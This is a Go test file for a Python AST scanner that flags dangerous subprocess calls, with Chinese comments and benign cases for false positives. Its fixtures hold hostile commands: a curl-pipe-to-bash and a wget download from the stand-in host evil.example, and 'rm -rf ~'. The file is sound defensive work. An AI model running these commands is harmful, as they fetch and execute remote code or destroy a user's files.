package astscan

import (
	"strings"
	"testing"
)

func scan(t *testing.T, src string) []Danger {
	t.Helper()
	return ScanPython([]byte(src), "test.py")
}

// 恶意：curl | bash 下载执行链
func TestScanDangerousSubprocess(t *testing.T) {
	d := scan(t, `
import subprocess
subprocess.run(["bash", "-c", "curl -s http://evil.example/x.sh | bash"])
`)
	if len(d) != 1 {
		t.Fatalf("dangers = %d, want 1: %+v", len(d), d)
	}
	if d[0].RuleID != "RS-037" || d[0].Weight != 95 {
		t.Fatalf("unexpected danger: %+v", d[0])
	}
	if !strings.Contains(d[0].Snippet, "curl") {
		t.Fatalf("snippet missing curl: %q", d[0].Snippet)
	}
}

// 良性：soffice 文档转换——必须不报
func TestScanBenignSubprocess(t *testing.T) {
	d := scan(t, `
import subprocess
subprocess.run(["soffice", "--headless", "--convert-to", "pdf", "x.docx"])
`)
	if len(d) != 0 {
		t.Fatalf("benign subprocess flagged: %+v", d)
	}
}

// wget 下载执行
func TestScanWgetChain(t *testing.T) {
	d := scan(t, `
subprocess.Popen(["wget", "-O", "/tmp/x", "http://evil.example/payload"])
`)
	if len(d) != 1 || d[0].Weight != 95 {
		t.Fatalf("wget chain not detected: %+v", d)
	}
}

// bash -c 脚本（无网络特征）→ 85 分
func TestScanBashC(t *testing.T) {
	d := scan(t, `
subprocess.call(["bash", "-c", "rm -rf ~"])
`)
	if len(d) != 1 || d[0].Weight != 85 {
		t.Fatalf("bash -c not detected: %+v", d)
	}
}

// 环境变量直接执行（无危险词参数）→ 不报（留给正则/数据流）
func TestScanVariableArgsNoFlag(t *testing.T) {
	d := scan(t, `
cmd = ["python3", "script.py"]
subprocess.run(cmd)
`)
	if len(d) != 0 {
		t.Fatalf("variable args flagged (need dataflow later): %+v", d)
	}
}

// 非 subprocess 调用不报
func TestScanUnrelatedCall(t *testing.T) {
	d := scan(t, `
result = os.system("ls")
subprocess.run(["git", "status"])
`)
	if len(d) != 0 {
		t.Fatalf("unrelated calls flagged: %+v", d)
	}
}

// 行号正确
func TestScanLineNumber(t *testing.T) {
	d := scan(t, "a = 1\nb = 2\nsubprocess.run([\"bash\", \"-c\", \"curl evil\"])")
	if len(d) != 1 || d[0].Line != 3 {
		t.Fatalf("line = %d, want 3 (%+v)", d[0].Line, d)
	}
}
